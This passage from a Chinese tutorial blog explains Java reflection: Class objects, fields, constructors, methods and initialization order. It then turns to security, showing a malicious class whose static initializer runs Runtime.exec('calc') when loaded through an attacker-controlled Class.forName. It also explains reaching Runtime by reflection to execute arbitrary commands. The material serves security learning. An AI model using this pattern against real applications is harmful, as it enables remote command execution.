<li>Class类对象阶段：类名.class：通过类名的属性class获取。</li>
<li>实例化对象阶段：对象.getClass()：getClass()方法在Object类中定义着。</li>
<li>类加载器ClassLoader.getSystemClassLoader().loadClass(“全类名”)</li>
</ol>
<p>编写Person类</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659366695287-caf09e61-9e59-4862-9839-c7f7880932bb.png"
                      alt="image.png"
                ></p>
<p>获取Class类对象</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1660095967523-d8071b26-459f-4023-847d-0e21f5f1dc45.png"
                      alt="1660095958223.png"
                ></p>
<p>同一个字节码文件(*.class)，在一次程序运行过程中，只会被加载一次。因此获取的四个Class类对象是相等的。</p>
<p>这里有一个容易混淆的地方，我们介绍了四种方法来获取Class类对象，观察其输出结果，均为<code>org.domain.Person</code>。而Java内置的<code>java.lang.Class</code>也叫Class类对象，两者有什么区别和联系？</p>
<p><code>java.lang.Class</code>不只是类对象，还是一个模板，<code>org.domain.Person</code>便是根据该模板生成的，因此<code>org.domain.Person</code>本质上也是<code>java.lang.Class</code>类对象。<code>org.domain.Person</code>下存在一个<code>getClass()</code>方法来获取<code>java.lang.Class</code>对象。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1661613633642-c7d1c555-e496-4d4a-9126-b77e544d9214.png"
                      alt="image.png"
                ></p>
<h3 id="获取Class类成员变量"><a href="#获取Class类成员变量" class="headerlink" title="获取Class类成员变量"></a>获取Class类成员变量</h3><p>获取Class类成员变量主要是为了对其数值进行更改。</p>
<ol>
<li><code>Field[] getFields()</code>、<code>Field getField(String name)</code>获取public修饰的成员变量</li>
<li><code>Field[] getDeclaredFields()</code>、<code>Field getDeclaredField(String name)</code>获取全部成员变量</li>
<li><code>void set(Object obj,Object value)</code>设置field值</li>
<li><code>Object get(Object obj)</code>获取值</li>
<li>针对非public修饰符的成员变量，在单独反射时，需要将其<code>setAccessible(true)</code>;</li>
</ol>
<p>实例：</p>
<p>首先编写Person类如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="keyword">protected</span> String b;</span><br><span class="line">    String c;</span><br><span class="line">    <span class="keyword">private</span> String d;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,String a)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.a=a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">( String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String a,String... name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.a=a;</span><br><span class="line">        <span class="keyword">for</span>(String n:name)&#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, a=&#x27;&quot;</span> + a + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, b=&#x27;&quot;</span> + b + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, c=&#x27;&quot;</span> + c + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, d=&#x27;&quot;</span> + d + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">(String food)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat...&quot;</span>+food);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用反射机制获取Class类成员变量并修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"><span class="keyword">import</span> org.domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span>Person.class;</span><br><span class="line">        <span class="comment">//Field[] getFields()</span></span><br><span class="line">        Field[] fields=cls.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field:fields)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field a=cls.getField(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//获取a的值。get(Object obj)</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Object value=a.get(p);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">        <span class="comment">//设置a的值。set(Object obj,Object value)</span></span><br><span class="line">        a.set(p,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        System.out.println(<span class="string">&quot;================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部成员变量。Field[] getDeclaredFields()</span></span><br><span class="line">        Field[] fields1= cls.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field:fields1)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取指定私有成员变量。Field getDeclaredField()</span></span><br><span class="line">        Field d=cls.getDeclaredField(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">        <span class="comment">//忽略访问权限修饰符的安全检查</span></span><br><span class="line">        <span class="comment">//暴力反射</span></span><br><span class="line">        d.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object value2=d.get(p);</span><br><span class="line">        System.out.println(value2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1660098101087-515a945a-b1fe-42da-93c2-11ab37728342.png"
                      alt="image.png"
                ></p>
<h3 id="获取Class类构造方法"><a href="#获取Class类构造方法" class="headerlink" title="获取Class类构造方法"></a>获取Class类构造方法</h3><p>获取构造方法后，可以使用构造方法创建实例化对象</p>
<ol>
<li><code>Constructor&lt;?&gt;[] getConstructors()</code>、<code>Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)</code>获取public构造方法</li>
<li><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code>、<code>Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</code>获取全部构造方法</li>
<li><code>constructor.newInstance()</code> 使用构造方法创建实例化对象。</li>
<li>当使用无参数构造方法创建实例化对象时，可以简化为使用Class类对象操作：<code>class.newInstace()</code>。</li>
<li><code>setAccessible()</code>方法适用</li>
</ol>
<p>实例：Person类保持不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Person.class;</span><br><span class="line">        <span class="comment">//Constructor&lt;?&gt;[] getConstructors()</span></span><br><span class="line">        Constructor[] constructors=cls.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor:constructors)&#123;</span><br><span class="line">            System.out.println(constructors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Constructor&lt;?&gt; getConstructor(Class&lt;?&gt;... parameterTypes )</span></span><br><span class="line">        Constructor&lt;?&gt; constructor=cls.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        Object person=constructor.newInstance(<span class="string">&quot;张三&quot;</span>,<span class="number">23</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor1=cls.getConstructor();</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line">        Object person1=constructor1.newInstance();</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">        <span class="comment">//简化</span></span><br><span class="line">        Object person2=cls.newInstance();</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230609000050942.png"
                      alt="image-20230609000050942"
                ></p>
<h3 id="获取Class类成员方法"><a href="#获取Class类成员方法" class="headerlink" title="获取Class类成员方法"></a>获取Class类成员方法</h3><ol>
<li><code>Method[] getMethods()</code>、<code>Method getMethod(String name,Class&lt;?&gt;... parameterTypes)</code>获取public类成员方法。注意这里获取全部public类成员方法的时候会获取Object类的public成员方法</li>
<li><code>Method[] getDeclaredMethods()</code>、<code>Method getDeclaredMethod(String name,Class&lt;?&gt;... parameterTypes)</code>获取全部类成员方法，当然也包括Object类</li>
<li><code>String method.getName()</code> 获取方法名</li>
<li><code>String class.getName()</code>获取类名</li>
<li><code>method.invoke(Object obj,Class&lt;?&gt;...parameterTypes)</code>执行类成员方法</li>
<li><code>setAccessible()</code>方法适用</li>
</ol>
<p>实例：Person类保持不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.security.jgss.GSSUtil;</span><br><span class="line"><span class="keyword">import</span> org.domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;org.domain.Person&quot;</span>);</span><br><span class="line">        <span class="comment">//获取指定名称的方法</span></span><br><span class="line">        Method eat_method=cls.getMethod(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">        System.out.println(eat_method);</span><br><span class="line">        <span class="comment">//输出方法名</span></span><br><span class="line">        String eat_methodName=eat_method.getName();</span><br><span class="line">        System.out.println(eat_methodName);</span><br><span class="line">        <span class="comment">//执行方法</span></span><br><span class="line">        Person person=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        eat_method.invoke(person);</span><br><span class="line">        Method eat_method2=cls.getMethod(<span class="string">&quot;eat&quot;</span>,String.class);</span><br><span class="line">        System.out.println(eat_method2);</span><br><span class="line">        eat_method2.invoke(person,<span class="string">&quot;meet&quot;</span>);</span><br><span class="line">        <span class="comment">//获取全部指定类成员方法</span></span><br><span class="line">        Method[] methods=cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String className=cls.getName();</span><br><span class="line">        System.out.println(className);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1660146493707-73a30df7-753b-45e5-81f6-f584a30e63a8.png"
                      alt="image.png"
                ></p>
<h3 id="Java反射与安全"><a href="#Java反射与安全" class="headerlink" title="Java反射与安全"></a>Java反射与安全</h3><p>P牛：Java反射可以给Java这门静态语言赋予动态特性。“⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，我称之为动态特性 ”。</p>
<p>如下代码中<code>execute</code>方法，根据传入的<code>ClassName</code>参数不同，获取不同的<code>Class</code>类对象。再根据<code>MethodName</code>不同，获取该类对象下的方法。最后使用<code>invoke</code>方法来执行该方法。</p>
<p>当不知道传入的参数是什么的时候，这段代码最终实现的功能是未知的。这便是动态特性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String ClassName,String MethodName)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class cls=Class.forName(ClassName);</span><br><span class="line">        cls.getMethod(MethodName).invoke(cls.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String ClassName=sc.next();</span><br><span class="line">        String MethodName=sc.next();</span><br><span class="line">        ReflectDemo5 ref=<span class="keyword">new</span> <span class="title class_">ReflectDemo5</span>();</span><br><span class="line">        ref.execute(ClassName,MethodName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个容易忽略的点，<code>forName</code>是<code>java.lang.Class</code>类的static方法，只要我们能拿到<code>java.lang.Class</code>类便可以执行<code>forName</code>，而在“获取Class类对象的四种方法”小节的最后，我们发现任何Class类都可以通过<code>getClass()</code>方法来获取<code>java.lang.Class</code>对象。</p>
<p>例如存在<code>String a</code>：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1661614173345-b1686b43-85d2-4908-9747-f0224cc7fde8.png"
                      alt="image.png"
                ></p>
<p>当然在本例中的cls3，通过对<code>java.lang.Class</code>对象进行操作，最后又获取到<code>java.lang.Class</code>对象是没什么意义的，这里仅仅是要了解其方法。</p>
<p><code>forName</code>有三个函数重载</p>
<ul>
<li>forName(String className)</li>
<li>forName(String name, boolean initialize,ClassLoader loader)</li>
<li>forName(Module module, String name) &#x2F;&#x2F;模块部分是JDK9添加的特性，还未学习，暂不考虑学习此方法</li>
</ul>
<p>第一个是常见的获取Class的方式。查看器源代码会发现其最后会返回<code>forName0(className, true, ClassLoader.getClassLoader(caller), caller)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="keyword">return</span> forName0(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller), caller);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>至于第二个方法，忽略中间代码，发现其最后返回<code>forName0(name, initialize, loader, caller)</code>，由此可知，方法二是对方法一的一个封装。默认了<code>initialize</code>和<code>loader</code>两个参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="type">boolean</span> initialize,</span><br><span class="line">                               ClassLoader loader)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">    Class&lt;?&gt; caller = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// Reflective call to get caller class is only needed if a security manager</span></span><br><span class="line">    <span class="comment">// is present.  Avoid the overhead of making this call otherwise.</span></span><br><span class="line">    caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> ClassLoader.getClassLoader(caller);</span><br><span class="line">    <span class="keyword">if</span> (ccl != <span class="literal">null</span>) &#123;</span><br><span class="line">    sm.checkPermission(</span><br><span class="line">    SecurityConstants.GET_CLASSLOADER_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> forName0(name, initialize, loader, caller);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>至于两个参数的含义，<code>initialize</code>表示是否进行初始化，<code>loader</code>表示<code>ClassLoader</code>，暂不考虑<code>ClassLoader</code>的学习。</p>
<p>当<code>initialize=true</code>的时候，使用forName来获取Class对象时，Class对象会自动初始化。</p>
<p>在Java中，存在三种初始化方法。分别是<code>static&#123;&#125;</code>，<code>&#123;&#125;</code>和构造函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo7</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ReflectDemo7() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Reflect&quot;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ReflectDemo7 rf=<span class="keyword">new</span> <span class="title class_">ReflectDemo7</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么三者存在什么区别？</p>
<blockquote>
<p>Person p &#x3D; new Person(“zhangsan”,20); 该句话都做了什么事情？</p>
<ol>
<li>因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。</li>
<li>执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</li>
<li>在堆内存中开辟空间，分配内存地址。</li>
<li>在堆内存中建立对象的特有属性。并进行默认初始化。</li>
<li>对属性进行显示初始化。</li>
<li>对对象进行构造代码块初始化。</li>
<li>对对象进行对应的构造函数初始化。</li>
<li>将内存地址付给栈内存中的p变量。</li>
</ol>
</blockquote>
<p>从上述可以看出在步骤2就已经运行<code>static&#123;&#125;</code>方法，步骤四运行<code>&#123;&#125;</code>方法，步骤六运行构造代码块。可以运行上面的代码判断顺序是否正确。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662132897467-d153c776-9c17-41f9-a20e-4c866d7ca600.png"
                      alt="image.png"
                ></p>
<p>对比2、4、6三个步骤会发现，<code>static&#123;&#125;</code>方法是对Class类初始化，发生在找到Class类对象的时候。另外两种方法则发生在步骤3分配内存之后。</p>
<p>而我们上面提到的：使用forName来获取Class对象时，Class对象会自动初始化。forName同样存在一个寻找Class类对象的过程，找到对象后执行static方法。但其没有分配内存，也就是后面两种方法并不会执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo7</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ReflectDemo7() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Reflect&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;org.ReflectDemo.ReflectDemo7&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662133910438-148af0b8-4825-491b-ad36-8390a0aa1422.png"
                      alt="image.png"
                ></p>
<p>当我们能够操作如下代码中的<code>className</code>参数时：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String className)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class cls=Class.forName(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以将<code>className</code>指向我们构造的恶意类。其中的<code>static&#123;&#125;</code>方法为构造的恶意方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pr</span> <span class="operator">=</span> rt.exec(command);</span><br><span class="line">            pr.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>除了使用<code>forName()</code>方法指向恶意类外，也可以使用<code>forName()</code>指向Java的内置类，通过这种方法可以省去<code>import</code>。获取Java内置类之后，若存在无参数构造方法，只要使用<code>class.newInstance()</code>，便可将其实例化（上面获取Class类构造方法提到过），而后利用其属性或方法。例如，如果我们可以获取到<code>Runtime</code>类实例，便可以使用<code>exec()</code>方法来执行任意命令。</p>
<p>但是很不幸的是，很多时候<code>class.newInstance()</code>会失效。主要原因：</p>
<ul>
<li>类不存在无参数构造方法</li>
<li>类无参数构造方法是私有的</li>
</ul>
<p>例如<code>Runtime</code>类的无参数构造方法便是<code>private</code>，当需要获取<code>Runtime</code>实例化对象时，需要调用其静态方法<code>getRuntime</code>来返回实例化对象。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662455146683-c2881f52-b8d6-41e1-a754-6985e0f355c3.png"
                      alt="image.png"
                ></p>
<p>这么做的目的涉及到Java的单例模式。</p>
<blockquote>
<p>单例模式，属于创建类型的一种常用的软件设计模式。通过单例模式的方法创建的类在当前进程中只有一个实例（根据需要，也有可能一个线程中属于单例，如：仅线程上下文内使用同一个实例）</p>
</blockquote>
<p>如下代码，通过两次new产生的实例化对象是不同的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReflectDemo8</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String agrs[])</span>&#123;</span><br><span class="line">        ReflectDemo8 rf1=<span class="keyword">new</span> <span class="title class_">ReflectDemo8</span>();</span><br><span class="line">        ReflectDemo8 rf2=<span class="keyword">new</span> <span class="title class_">ReflectDemo8</span>();</span><br><span class="line">        System.out.println(rf1==rf2);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是经过单例模式实例化的对象rf1和rf2是相同的。保证了线程中只存在一个<code>ReflectDemo8</code>实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo8</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ReflectDemo8 reflect=<span class="keyword">new</span> <span class="title class_">ReflectDemo8</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ReflectDemo8 <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> reflect;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ReflectDemo8</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String agrs[])</span>&#123;</span><br><span class="line">        ReflectDemo8 rf1=ReflectDemo8.getInstance();</span><br><span class="line">        ReflectDemo8 rf2=ReflectDemo8.getInstance();</span><br><span class="line">        System.out.println(rf1==rf2); <span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到正题，既然在<code>Runtime</code>类中，<code>getRuntime</code>可以获取实例化对象。那我们直接调用不就好了。</p>
